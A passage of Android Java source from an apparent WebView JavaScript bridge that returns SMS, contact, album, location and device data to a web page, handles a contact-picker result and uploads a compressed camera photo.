                        if (200 == data.getCode()) {
                            if (smsBeanList !=null){
                                callJSSuccess(models.getAppAction(), models.getAppActionId(), new Gson().toJson(smsBeanList));
                            }else if (contactBeanList !=null){
                                callJSSuccess(models.getAppAction(), models.getAppActionId(), new Gson().toJson(contactBeanList));
                            }else if (albumBeanList !=null){
                                callJSSuccess(models.getAppAction(), models.getAppActionId(), new Gson().toJson(albumBeanList));
                            }else if (geoBeanList !=null){
                                callJSSuccess(models.getAppAction(), models.getAppActionId(), new Gson().toJson(geoBeanList));
                            }else if (deviceBean !=null){
                                callJSSuccess(models.getAppAction(), models.getAppActionId(), new Gson().toJson(deviceBean));
                            }else {
                                callJSSuccess(models.getAppAction(), models.getAppActionId(), null);
                            }
                        } else {
                            callJSFailNet(models.getAppAction(), models.getAppActionId(), data.getMessage());
                        }
                    }
                });
    }


    private void callJSFailOther(String appAction, String appActionId, String error) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("999");
        model.setErrorMsg(error);
        callJS(model);
    }


    private void callJSFailP(String appAction, String appActionId) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("2");
        callJS(model);
    }

    private void callJSFailNet(String appAction, String appActionId, String error) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("1");
        model.setErrorMsg(error);
        callJS(model);
    }

    private void callJSSuccess(String appAction, String appActionId, String data) {
        JsBridgeCallBackModel model = new JsBridgeCallBackModel();
        model.setAppAction(appAction);
        model.setAppActionId(appActionId);
        model.setAppStatus("0");
        model.setAppData(data);
        callJS(model);
    }

    public void callJS(JsBridgeCallBackModel model) {
        mWebView.post(() -> {
            try {
                final String js = String.format("javascript: window.appCallback && window.appCallback(%1$s);", new Gson().toJson(model));
                LogUtils.d( "----- appData回传：" + js);
                mWebView.evaluateJavascript(js, null);
            } catch (Throwable w) {
                w.printStackTrace();
            }
        });
    }

    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_SELECT_CONTACTS) {
            if (resultCode == RESULT_OK) {
                try {
                    ContactInfoBackModel contactInfoModel = new ContactInfoBackModel();
                    Uri contactData = data.getData();
                    Cursor cursor = App.get().getContentResolver().query(contactData, null, null, null, null);
                    if (cursor != null) {
                        cursor.moveToFirst();
                        contactInfoModel.name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        Cursor phone = App.get().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = "
                                        + cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)), null, null);
                        if (phone != null) {
                            phone.moveToNext();
                            contactInfoModel.mobile = phone.getString(phone.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phone.close();
                        }
                        cursor.close();
                        LogUtils.d("选择通讯录信息：\n" + contactInfoModel.toString());
                        callJSSuccess(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), new Gson().toJson(contactInfoModel));
                    } else {
                        callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "null");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), e.toString());
                }
            } else {
                callJSFailOther(selectContactJsBridgeModel.getAppAction(), selectContactJsBridgeModel.getAppActionId(), "cancel selection");
            }
        } else if (requestCode == REQUEST_TACK_PHOTO) {
            if (resultCode == RESULT_OK) {
                LoadingUtil.show();
                new Thread(() -> {
                    File file = null;
                    if (photoFile != null) {
                        LogUtils.d("压缩前：" + photoFile.length());
                        try {
                            file = ComUtil.compressImage(photoFile.getAbsolutePath());
                        }catch (Exception e){
                            e.printStackTrace();
                            file = photoFile;
                        }
                        LogUtils.d("压缩后：" + file.length());
                    }
                    if (file == null) {
                        LoadingUtil.dismiss();
                        callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "file is null");
                        return;
                    }
                    NetUpload.okHttpUploadImage(file, new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            LoadingUtil.dismiss();
                            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {
                            LoadingUtil.dismiss();
                            if (response.isSuccessful()){
                                try {
                                    String responseBody = NetUpload.getResponseBody(response);
                                    ImageResponse imageResponse=new Gson().fromJson(responseBody,ImageResponse.class);
                                    JSCommonJSModel jsCommonJSModel = new JSCommonJSModel();
                                    jsCommonJSModel.setValue(imageResponse.getData());
                                    callJSSuccess(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), new Gson().toJson(jsCommonJSModel));
                                }catch (Exception e){
                                    e.printStackTrace();
                                    callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
                                }
                            }else {
                                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "");
                            }
                        }
                    });
//                    RequestBody imageBody = RequestBody.create(MediaType.parse("multipart/form-data"), file);
//                    MultipartBody.Part txtBodyPart = MultipartBody.Part.createFormData("type", "jpg");
//                    MultipartBody.Part imageBodyPart = MultipartBody.Part.createFormData("file", file.getName(), imageBody);
//                    Call<ImageResponse> repos = NetClient.getNewService().uploadImg(txtBodyPart, imageBodyPart);
//                    repos.enqueue(new Callback<ImageResponse>() {
//                        @Override
//                        public void onResponse(Call<ImageResponse> call, Response<ImageResponse> response) {
//                            LoadingUtil.dismiss();
//                            try {
//                                if (response.code() == 200) {
//                                    JSCommonJSModel jsCommonJSModel = new JSCommonJSModel();
//                                    jsCommonJSModel.setValue(response.body().getData());
//                                    callJSSuccess(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), new Gson().toJson(jsCommonJSModel));
//                                } else {
//                                    callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), response.message());
//                                }
//                            } catch (Exception e) {
//                                e.printStackTrace();
//                                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), e.toString());
//                            }
//                        }
//
//                        @Override
//                        public void onFailure(Call<ImageResponse> call, Throwable t) {
//                            LoadingUtil.dismiss();
//                            callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), t.toString());
//                        }
//                    });
                }).start();
            } else {
                callJSFailOther(tackPhotoJsBridgeModel.getAppAction(), tackPhotoJsBridgeModel.getAppActionId(), "cancel selection");
            }
        }
    }


}
